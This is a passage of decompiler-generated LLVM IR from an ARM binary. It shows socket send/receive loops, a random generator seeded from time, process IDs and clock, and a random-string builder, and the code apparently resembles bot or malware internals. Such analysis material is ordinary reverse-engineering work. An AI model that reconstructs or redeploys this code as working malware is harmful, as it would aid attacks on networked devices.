  %v0_10ab8 = call i32 @function_13d0c()
  %v0_10abc = load i32, i32* @r4, align 4
  store i32 %v0_10abc, i32* %r2.global-to-local, align 4
  %v1_10ac0 = load i32, i32* @fp, align 4
  %v2_10ac0 = inttoptr i32 %v1_10ac0 to i32*
  store i32 %v0_10ab8, i32* %v2_10ac0, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10acc = load i32, i32* @r5, align 4
  %v1_10acc = inttoptr i32 %v0_10acc to i32*
  %v2_10acc = load i32, i32* %v1_10acc, align 4
  %v4_10ad0 = call i32 @_send(i32 %v2_10acc, i32 ptrtoint (i32* @global_var_14430.213 to i32), i32 %v0_10abc, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_10adc = load i32, i32* @r5, align 4
  %v1_10adc = inttoptr i32 %v0_10adc to i32*
  %v2_10adc = load i32, i32* %v1_10adc, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10ae8 = call i32 @_send(i32 %v2_10adc, i32 %v2_109f8, i32 1, i32 16384)
  %v3_10aec = load i8, i8* %stack_var_-38, align 1
  %v4_10aec = sext i8 %v3_10aec to i32
  store i32 %v4_10aec, i32* %r2.global-to-local, align 4
  %v2_10af0 = icmp eq i8 %v3_10aec, 0
  br i1 %v2_10af0, label %dec_label_pc_1066c.backedge, label %dec_label_pc_10af8

dec_label_pc_10af8:                               ; preds = %dec_label_pc_10aac
  %v0_10af8 = load i32, i32* @r5, align 4
  %v1_10af8 = inttoptr i32 %v0_10af8 to i32*
  %v2_10af8 = load i32, i32* %v1_10af8, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10b04 = call i32 @_send(i32 %v2_10af8, i32 %v2_104d0, i32 %v4_10aec, i32 16384)
  br label %dec_label_pc_1066c.backedge

dec_label_pc_10b0c:                               ; preds = %dec_label_pc_1091c, %dec_label_pc_108a4
  %stack_var_-37.3 = phi i8 [ %stack_var_-37.1, %dec_label_pc_108a4 ], [ %v1_10900, %dec_label_pc_1091c ]
  %v0_10b0c = load i32, i32* @r8, align 4
  %v1_10b0c = inttoptr i32 %v0_10b0c to i32*
  %v2_10b0c = load i32, i32* %v1_10b0c, align 4
  store i32 %v2_10b0c, i32* %r3.global-to-local, align 4
  %v7_10b10 = icmp eq i32 %v2_10b0c, 4
  br i1 %v7_10b10, label %dec_label_pc_1066c.backedge, label %bb86

bb86:                                             ; preds = %dec_label_pc_10b0c
  %v8_10b14 = icmp eq i32 %v2_10b0c, 11
  br i1 %v8_10b14, label %dec_label_pc_1066c.backedge, label %dec_label_pc_10958

dec_label_pc_10b20:                               ; preds = %dec_label_pc_108dc
  %v2_10b24 = load i32, i32* @global_var_1cd50.206, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10b34 = call i32 @_recv(i32 %v2_10b24, i32 %v2_109f8, i32 2, i32 16384)
  br label %dec_label_pc_1066c.backedge

dec_label_pc_10b3c:                               ; preds = %dec_label_pc_10950
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_10b4c = load i32, i32* @global_var_1cd50.206, align 4
  %v4_10b50 = call i32 @_recv(i32 %v2_10b4c, i32 %v2_109f8, i32 2, i32 16384)
  %v3_10b54 = load i8, i8* %stack_var_-38, align 1
  %v4_10b54 = sext i8 %v3_10b54 to i32
  %v4_10b5c = mul nsw i32 %v4_10b54, 256
  %v5_10b5c = or i32 %v4_10b5c, %v4_10920
  store i32 %v5_10b5c, i32* %r2.global-to-local, align 4
  store i32 %v4_10b54, i32* @lr, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_10b70 = load i32, i32* @global_var_1cd50.206, align 4
  store i8 %v1_10900, i8* %stack_var_-38, align 1
  %v7_10b7c = call i32 @_recv(i32 %v2_10b70, i32 %v2_1092c, i32 %v5_10b5c, i32 16384)
  %v3_10b80 = load i8, i8* %stack_var_-38, align 1
  %v4_10b80 = sext i8 %v3_10b80 to i32
  store i32 %v4_10b80, i32* %r2.global-to-local, align 4
  %v4_10b84 = zext i8 %v3_10b54 to i32
  store i32 %v4_10b84, i32* %r3.global-to-local, align 4
  %v4_10b88 = mul nuw nsw i32 %v4_10b84, 256
  %v5_10b88 = or i32 %v4_10b80, %v4_10b88
  %v7_10b88 = icmp eq i32 %v5_10b88, 0
  br i1 %v7_10b88, label %dec_label_pc_1066c.backedge, label %dec_label_pc_10b90

dec_label_pc_10b90:                               ; preds = %dec_label_pc_10b3c
  %v5_10b94 = call i32 @function_ae30(i32* nonnull %stack_var_-1616, i32 %v5_10b88, i32 %v4_10b80, i32 %v4_10b84)
  br label %dec_label_pc_1066c.backedge

; uselistorder directives
  uselistorder i32 %v4_10b84, { 1, 0, 2 }
  uselistorder i32 %v4_10b80, { 1, 0, 2 }
  uselistorder i32 %v4_10b54, { 1, 0 }
  uselistorder i8 %v3_10b54, { 2, 3, 1, 0 }
  uselistorder i8 %stack_var_-37.3, { 1, 0, 2 }
  uselistorder i32 %v3_10988, { 1, 3, 2, 0 }
  uselistorder i32 %v4_10944, { 1, 0 }
  uselistorder i32 %v4_10920, { 1, 0 }
  uselistorder i8 %v1_10900, { 0, 2, 1 }
  uselistorder i32 %v3_108f84, { 0, 2, 1 }
  uselistorder i32 %v4_108f4, { 1, 0 }
  uselistorder i32 %v4_108c8, { 1, 0 }
  uselistorder i32 %v2_1086c, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_107a0, { 3, 2, 1, 0 }
  uselistorder i8 %stack_var_-37.1, { 9, 8, 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %v5_1075c, { 2, 1, 0 }
  uselistorder i32 %v2_106a0, { 2, 1, 0 }
  uselistorder i32 %v1_10690, { 1, 2, 0 }
  uselistorder i32 %v1_10678, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1620.0, { 0, 3, 1, 2 }
  uselistorder i32 %v2_10a1c, { 1, 0, 2 }
  uselistorder i32 %v2_109f8, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v2_10668, { 1, 0, 2 }
  uselistorder i32 %v2_10664, { 1, 0, 2 }
  uselistorder i32 %v4_105d0, { 1, 2, 0 }
  uselistorder i32 %v2_10518, { 0, 9, 1, 10, 2, 3, 4, 5, 8, 6, 11, 7 }
  uselistorder i32 %v1_10464, { 1, 0 }
  uselistorder i32 %v1_10434, { 1, 0 }
  uselistorder i32 %v0_10428, { 1, 0 }
  uselistorder i32 %v1_10400, { 1, 0 }
  uselistorder i32 %v0_103f4, { 1, 0 }
  uselistorder i32 %v1_103cc, { 1, 0 }
  uselistorder i32 %v0_103c0, { 1, 0 }
  uselistorder i32 %v1_10398, { 1, 0 }
  uselistorder i32 %v0_10388, { 1, 0 }
  uselistorder i32 %v0_10384, { 1, 0 }
  uselistorder i32 %v0_10364, { 1, 0 }
  uselistorder i32 %v4_10240, { 1, 2, 0 }
  uselistorder i32* %stack_var_-36, { 0, 2, 3, 1 }
  uselistorder i32* %stack_var_-48, { 1, 2, 0, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-106, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-138, { 1, 0, 2 }
  uselistorder i8* %stack_var_-38, { 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 5, 4, 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 57, 58, 41, 42, 38, 55, 56, 39, 40, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32* @global_var_1cd54.164, { 1, 0 }
  uselistorder i32 16386, { 1, 0, 2, 4, 3, 5 }
  uselistorder i8* bitcast (i8** @global_var_1cda8.209 to i8*), { 0, 1, 3, 2 }
  uselistorder i8** @global_var_1cda8.209, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1cda8.209 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1cd4c.166, { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_1cd50.206, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 13, 12, 14, 15 }
  uselistorder i32 ()* @_write, { 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @function_13a7c, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62 }
  uselistorder i32 (i32, i32)* @function_10c8c, { 2, 1, 0 }
  uselistorder i32 ()* @function_ffd8, { 1, 0 }
  uselistorder i8** @global_var_1ce00.171, { 1, 0 }
  uselistorder i32 (i8*, i32, ...)* @open, { 4, 3, 6, 5, 1, 0, 2, 7 }
  uselistorder void (i32)** @global_var_ffc0.176, { 1, 0 }
  uselistorder void (i32)* (i32, void (i32)*)* @signal, { 1, 0, 3, 2 }
  uselistorder i32 (i8*)* @unlink, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1091c, { 1, 0 }
  uselistorder label %dec_label_pc_1066c.backedge, { 5, 11, 4, 10, 12, 3, 9, 2, 1, 8, 7, 0, 6 }
  uselistorder label %dec_label_pc_1079c, { 2, 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_106e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_106d4, { 1, 0 }
  uselistorder label %dec_label_pc_1068c.dec_label_pc_1068c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10674.dec_label_pc_10674_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_104f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_104cc, { 2, 0, 1 }
}

define i32 @function_10bd8() local_unnamed_addr {
dec_label_pc_10bd8:
  %v2_10be4 = load i32, i32* @global_var_1cdac.215, align 4
  %v2_10be8 = load i32, i32* @global_var_1cdb8.217, align 4
  store i32 ptrtoint (i32* @global_var_1cdb0.219 to i32), i32* @lr, align 4
  %v4_10bf4 = mul i32 %v2_10be4, 2048
  %v5_10bf4 = xor i32 %v4_10bf4, %v2_10be4
  %v4_10bf8 = udiv i32 %v2_10be8, 524288
  %v5_10bf8 = xor i32 %v4_10bf8, %v2_10be8
  %v2_10bfc = load i32, i32* @global_var_1cdb0.219, align 4
  %v2_10c00 = load i32, i32* @global_var_1cdb4.221, align 4
  %v2_10c04 = xor i32 %v5_10bf8, %v5_10bf4
  %v4_10c08 = udiv i32 %v5_10bf4, 256
  %v5_10c08 = xor i32 %v2_10c04, %v4_10c08
  store i32 %v2_10bfc, i32* @global_var_1cdac.215, align 4
  store i32 %v2_10c00, i32* @global_var_1cdb0.219, align 4
  store i32 %v2_10be8, i32* @global_var_1cdb4.221, align 4
  store i32 %v5_10c08, i32* @global_var_1cdb8.217, align 4
  ret i32 %v5_10c08

; uselistorder directives
  uselistorder i32 %v2_10be8, { 2, 1, 0 }
  uselistorder i32 %v2_10be4, { 1, 0 }
}

define i32 @function_10c30(i32 %arg1) local_unnamed_addr {
dec_label_pc_10c30:
  %stack_var_-12 = alloca i32, align 4
  %v3_10c30 = load i32, i32* @r4, align 4
  store i32 %v3_10c30, i32* %stack_var_-12, align 4
  %v2_10c38 = call i32 @time(i32* null)
  store i32 %v2_10c38, i32* @global_var_1cdac.215, align 4
  %v1_10c44 = call i32 @_getpid(i32 %v2_10c38)
  %v0_10c4c = call i32 @getppid()
  %v2_10c54 = xor i32 %v1_10c44, %v0_10c4c
  store i32 %v2_10c54, i32* @global_var_1cdb0.219, align 4
  %v1_10c5c = call i32 @clock()
  %v2_10c60 = load i32, i32* @global_var_1cdb0.219, align 4
  %v2_10c6c = xor i32 %v2_10c60, %v1_10c5c
  store i32 %v2_10c6c, i32* @global_var_1cdb8.217, align 4
  store i32 %v1_10c5c, i32* @global_var_1cdb4.221, align 4
  %v2_10c78 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10c78, i32* @r4, align 4
  ret i32 %v1_10c5c

; uselistorder directives
  uselistorder i32 %v1_10c5c, { 1, 2, 0 }
  uselistorder i32 (i32)* @_getpid, { 0, 2, 1 }
}

define i32 @function_10c8c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10c8c:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-69 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10c8c = load i32, i32* @r4, align 4
  store i32 %v3_10c8c, i32* %stack_var_-36, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_14470.227 to i32), i32* %r1.global-to-local, align 4
  %v2_10ca0 = ptrtoint i32* %stack_var_-69 to i32
  store i32 %v2_10ca0, i32* %r0.global-to-local, align 4
  store i32 33, i32* %r2.global-to-local, align 4
  %v4_10ca8 = call i32 @_memcpy(i32 %v2_10ca0, i32 ptrtoint ([33 x i8]* @global_var_14470.227 to i32), i32 33)
  store i32 %v4_10ca8, i32* %r0.global-to-local, align 4
  %v0_10cac = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_10cac = icmp slt i32 %v0_10cac, 0
  store i1 %v1_10cac, i1* %cpsr_n.global-to-local, align 1
  %v2_10cac = icmp eq i32 %v0_10cac, 0
  store i1 %v2_10cac, i1* %cpsr_z.global-to-local, align 1
  %tmp20 = icmp slt i32 %v0_10cac, 1
  br i1 %tmp20, label %dec_label_pc_10d98, label %dec_label_pc_10cb4

dec_label_pc_10cb4:                               ; preds = %dec_label_pc_10c8c
  store i32 ptrtoint (i32* @global_var_1cdb8.217 to i32), i32* %fp.global-to-local, align 4
  %v2_10cc0 = load i32, i32* @global_var_1cdb4.221, align 4
  store i32 %v2_10cc0, i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdac.215 to i32), i32* %r3.global-to-local, align 4
  %v2_10cc8 = load i32, i32* @global_var_1cdb0.219, align 4
  store i32 %v2_10cc8, i32* %sl.global-to-local, align 4
  %v2_10ccc = load i32, i32* @global_var_1cdb8.217, align 4
  store i32 %v2_10ccc, i32* %r6.global-to-local, align 4
  %v2_10cd0 = load i32, i32* @global_var_1cdac.215, align 4
  store i32 %v2_10cd0, i32* %ip.global-to-local, align 4
  %v0_10cd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_10cd4 = add i32 %v0_10cd4, 1
  store i32 %v1_10cd4, i32* %r7.global-to-local, align 4
  %v2_10ce0 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_10d40

dec_label_pc_10cdc:                               ; preds = %dec_label_pc_10d40
  %v1_10cdc = udiv i32 %v5_10d4c, 8
  %v4_10ce4 = urem i32 %v1_10cdc, 32
  %v5_10ce4 = add i32 %v4_10ce4, %v2_10ce0
  store i32 %v5_10ce4, i32* %r0.global-to-local, align 4
  %v3_10ce8 = mul i32 %v5_10d4c, 65536
  store i32 %v3_10ce8, i32* %r2.global-to-local, align 4
  store i32 %v2_10ce0, i32* %r3.global-to-local, align 4
  %v3_10cf0 = mul i32 %v5_10d4c, 256
  store i32 %v3_10cf0, i32* %r1.global-to-local, align 4
  %tmp21 = udiv i32 %v5_10d4c, 2048
  %v4_10cf4 = urem i32 %tmp21, 32
  %v5_10cf4 = add i32 %v4_10cf4, %v2_10ce0
  store i32 %v5_10cf4, i32* %ip.global-to-local, align 4
  %tmp22 = udiv i32 %v5_10d4c, 524288
  %v4_10cf8 = urem i32 %tmp22, 32
  %v5_10cf8 = add i32 %v4_10cf8, %v2_10ce0
  %v4_10cfc = udiv i32 %v2_10d48, 134217728
  %v5_10cfc = add i32 %v4_10cfc, %v2_10ce0
  store i32 %v5_10cfc, i32* %r4.global-to-local, align 4
  %v1_10d00 = add i32 %v5_10cf4, -33
  %v2_10d00 = inttoptr i32 %v1_10d00 to i8*
  %v3_10d00 = load i8, i8* %v2_10d00, align 1
  %v4_10d00 = zext i8 %v3_10d00 to i32
  store i32 %v4_10d00, i32* %r2.global-to-local, align 4
  %v1_10d04 = add i32 %v5_10ce4, -33
  %v2_10d04 = inttoptr i32 %v1_10d04 to i8*
  %v3_10d04 = load i8, i8* %v2_10d04, align 1
  %v4_10d04 = zext i8 %v3_10d04 to i32
  store i32 %v4_10d04, i32* %r3.global-to-local, align 4
  %v1_10d08 = add i32 %v5_10cf8, -33
  %v2_10d08 = inttoptr i32 %v1_10d08 to i8*
  %v3_10d08 = load i8, i8* %v2_10d08, align 1
  %v4_10d08 = zext i8 %v3_10d08 to i32
  store i32 %v4_10d08, i32* %r1.global-to-local, align 4
  %v1_10d0c = add i32 %v5_10cfc, -33
  %v2_10d0c = inttoptr i32 %v1_10d0c to i8*
  %v3_10d0c = load i8, i8* %v2_10d0c, align 1
  %v4_10d0c = zext i8 %v3_10d0c to i32
  store i32 %v4_10d0c, i32* %r0.global-to-local, align 4
  %v1_10d10 = add i32 %v0_10d10, -4
  store i32 %v1_10d10, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_10d14 = icmp slt i32 %v1_10d10, 0
  store i1 %v1_10d14, i1* %cpsr_n.global-to-local, align 1
  %v2_10d14 = icmp eq i32 %v1_10d10, 0
  store i1 %v2_10d14, i1* %cpsr_z.global-to-local, align 1
  %v3_10d18 = add i32 %v2_10d18, -1
  %v4_10d18 = inttoptr i32 %v3_10d18 to i8*
  store i8 %v3_10d04, i8* %v4_10d18, align 1
  %v0_10d1c = load i32, i32* %r2.global-to-local, align 4
  %v1_10d1c = trunc i32 %v0_10d1c to i8
  %v2_10d1c = load i32, i32* %r7.global-to-local, align 4
  %v3_10d1c = inttoptr i32 %v2_10d1c to i8*
  store i8 %v1_10d1c, i8* %v3_10d1c, align 1
  %v0_10d20 = load i32, i32* %r1.global-to-local, align 4
  %v1_10d20 = trunc i32 %v0_10d20 to i8
  %v2_10d20 = load i32, i32* %r7.global-to-local, align 4
  %v3_10d20 = add i32 %v2_10d20, 1
  %v4_10d20 = inttoptr i32 %v3_10d20 to i8*
  store i8 %v1_10d20, i8* %v4_10d20, align 1
  %v0_10d24 = load i32, i32* %r0.global-to-local, align 4
  %v1_10d24 = trunc i32 %v0_10d24 to i8
  %v2_10d24 = load i32, i32* %r7.global-to-local, align 4
  %v3_10d24 = add i32 %v2_10d24, 2
  %v4_10d24 = inttoptr i32 %v3_10d24 to i8*
  store i8 %v1_10d24, i8* %v4_10d24, align 1
  %v0_10d28 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10d28, i32* %ip.global-to-local, align 4
  %v0_10d2c = load i32, i32* %r7.global-to-local, align 4
  %v1_10d2c = add i32 %v0_10d2c, 4
  store i32 %v1_10d2c, i32* %r7.global-to-local, align 4
  %v0_10d30 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10d30 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_10d30 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_10d30 = xor i1 %v1_10d30, %v2_10d30
  %v4_10d30 = or i1 %v0_10d30, %v3_10d30
  br i1 %v4_10d30, label %dec_label_pc_10d7c, label %dec_label_pc_10d34

dec_label_pc_10d34:                               ; preds = %dec_label_pc_10d60, %dec_label_pc_10cdc
  %v2_10d6c6 = phi i32 [ %v1_10d74, %dec_label_pc_10d60 ], [ %v1_10d2c, %dec_label_pc_10cdc ]
  %v0_10d402 = phi i32 [ %v0_10d70, %dec_label_pc_10d60 ], [ %v0_10d28, %dec_label_pc_10cdc ]
  %v0_10d34 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_10d34, i32* %sl.global-to-local, align 4
  %v0_10d38 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10d38, i32* %sb.global-to-local, align 4
  %v0_10d3c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10d3c, i32* %r6.global-to-local, align 4
  %v0_10d50.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10d40

dec_label_pc_10d40:                               ; preds = %dec_label_pc_10cb4, %dec_label_pc_10d34
  %v2_10d18 = phi i32 [ %v1_10cd4, %dec_label_pc_10cb4 ], [ %v2_10d6c6, %dec_label_pc_10d34 ]
  %v0_10d10 = phi i32 [ %v0_10cac, %dec_label_pc_10cb4 ], [ %v0_10d50.pre, %dec_label_pc_10d34 ]
  %v0_10d44 = phi i32 [ %v2_10ccc, %dec_label_pc_10cb4 ], [ %v0_10d3c, %dec_label_pc_10d34 ]
  %v0_10d40 = phi i32 [ %v2_10cd0, %dec_label_pc_10cb4 ], [ %v0_10d402, %dec_label_pc_10d34 ]
  %v4_10d40 = mul i32 %v0_10d40, 2048
  %v5_10d40 = xor i32 %v4_10d40, %v0_10d40
  store i32 %v5_10d40, i32* %r3.global-to-local, align 4
  %v4_10d44 = udiv i32 %v0_10d44, 524288
  %v5_10d44 = xor i32 %v4_10d44, %v0_10d44
  %v2_10d48 = xor i32 %v5_10d44, %v5_10d40
  store i32 %v2_10d48, i32* %r2.global-to-local, align 4
  %v4_10d4c = udiv i32 %v5_10d40, 256
  %v5_10d4c = xor i32 %v4_10d4c, %v2_10d48
  store i32 %v5_10d4c, i32* %r5.global-to-local, align 4
  %v1_10d50 = add i32 %v0_10d10, -3
  %v2_10d50 = icmp ugt i32 %v0_10d10, 2
  %v3_10d50 = sub i32 2, %v0_10d10
  %v4_10d50 = and i32 %v3_10d50, %v0_10d10
  %v5_10d50 = icmp slt i32 %v4_10d50, 0
  store i1 %v5_10d50, i1* %cpsr_v.global-to-local, align 1
  %v6_10d50 = icmp slt i32 %v1_10d50, 0
  store i1 %v6_10d50, i1* %cpsr_n.global-to-local, align 1
  %v7_10d50 = icmp eq i32 %v0_10d10, 3
  store i1 %v7_10d50, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_10d4c, i32* %r0.global-to-local, align 4
  store i32 33, i32* %r1.global-to-local, align 4
  %v2_10d5c = xor i1 %v7_10d50, true
  %v3_10d5c = and i1 %v2_10d50, %v2_10d5c
  br i1 %v3_10d5c, label %dec_label_pc_10cdc, label %dec_label_pc_10d60

dec_label_pc_10d60:                               ; preds = %dec_label_pc_10d40
  %v2_10d60 = urem i32 %v5_10d4c, 33
  store i32 %v2_10d60, i32* %r0.global-to-local, align 4
  %v1_10d64 = add i32 %v0_10d10, -1
  store i32 %v1_10d64, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_10d68 = icmp slt i32 %v1_10d64, 0
  store i1 %v1_10d68, i1* %cpsr_n.global-to-local, align 1
  %v2_10d68 = icmp eq i32 %v1_10d64, 0
  store i1 %v2_10d68, i1* %cpsr_z.global-to-local, align 1
  %v1_10d6c = trunc i32 %v2_10d60 to i8
  %v3_10d6c = add i32 %v2_10d18, -1
  %v4_10d6c = inttoptr i32 %v3_10d6c to i8*
  store i8 %v1_10d6c, i8* %v4_10d6c, align 1
  %v0_10d70 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10d70, i32* %ip.global-to-local, align 4
  %v0_10d74 = load i32, i32* %r7.global-to-local, align 4
  %v1_10d74 = add i32 %v0_10d74, 1
  store i32 %v1_10d74, i32* %r7.global-to-local, align 4
  %v0_10d78 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10d78 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_10d78 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_10d78 = xor i1 %v1_10d78, %v2_10d78
  %v4_10d78 = or i1 %v0_10d78, %v3_10d78
  br i1 %v4_10d78, label %dec_label_pc_10d7c, label %dec_label_pc_10d34

dec_label_pc_10d7c:                               ; preds = %dec_label_pc_10d60, %dec_label_pc_10cdc
  store i32 ptrtoint (i32* @global_var_1cdb0.219 to i32), i32* %r3.global-to-local, align 4
  %v0_10d84 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10d84, i32* @global_var_1cdb4.221, align 4
  store i32 ptrtoint (i32* @global_var_1cdac.215 to i32), i32* %ip.global-to-local, align 4
  %v0_10d8c = load i32, i32* %r5.global-to-local, align 4
  %v1_10d8c = load i32, i32* %fp.global-to-local, align 4
  %v2_10d8c = inttoptr i32 %v1_10d8c to i32*
  store i32 %v0_10d8c, i32* %v2_10d8c, align 4
  %v0_10d90 = load i32, i32* %sb.global-to-local, align 4
  %v1_10d90 = load i32, i32* %r3.global-to-local, align 4
  %v2_10d90 = inttoptr i32 %v1_10d90 to i32*
  store i32 %v0_10d90, i32* %v2_10d90, align 4
  %v0_10d94 = load i32, i32* %sl.global-to-local, align 4
  %v1_10d94 = load i32, i32* %ip.global-to-local, align 4
  %v2_10d94 = inttoptr i32 %v1_10d94 to i32*
  store i32 %v0_10d94, i32* %v2_10d94, align 4
  %v2_10d9c.pre = load i32, i32* %stack_var_-36, align 4
  %v29_10d9c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d98

dec_label_pc_10d98:                               ; preds = %dec_label_pc_10c8c, %dec_label_pc_10d7c
  %v29_10d9c = phi i32 [ %v29_10d9c.pre, %dec_label_pc_10d7c ], [ %v4_10ca8, %dec_label_pc_10c8c ]
  %v2_10d9c = phi i32 [ %v2_10d9c.pre, %dec_label_pc_10d7c ], [ %v3_10c8c, %dec_label_pc_10c8c ]
  store i32 %v2_10d9c, i32* @r4, align 4
  ret i32 %v29_10d9c

; uselistorder directives
  uselistorder i32 %v1_10d74, { 1, 0 }
  uselistorder i32 %v0_10d70, { 1, 0 }
  uselistorder i32 %v5_10d4c, { 5, 6, 7, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_10d48, { 1, 2, 0 }
  uselistorder i32 %v0_10d40, { 1, 0 }
  uselistorder i32 %v0_10d44, { 1, 0 }
  uselistorder i32 %v0_10d10, { 2, 3, 0, 6, 5, 4, 1 }
  uselistorder i32 %v2_10d18, { 1, 0 }
  uselistorder i32 %v2_10ce0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_10cac, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 6, 2, 4, 5, 8, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 -33, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10d98, { 1, 0 }
  uselistorder label %dec_label_pc_10d40, { 1, 0 }
}

define i32 @function_10db4(i8* %arg1) local_unnamed_addr {
dec_label_pc_10db4:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_10db4 = load i32, i32* @r4, align 4
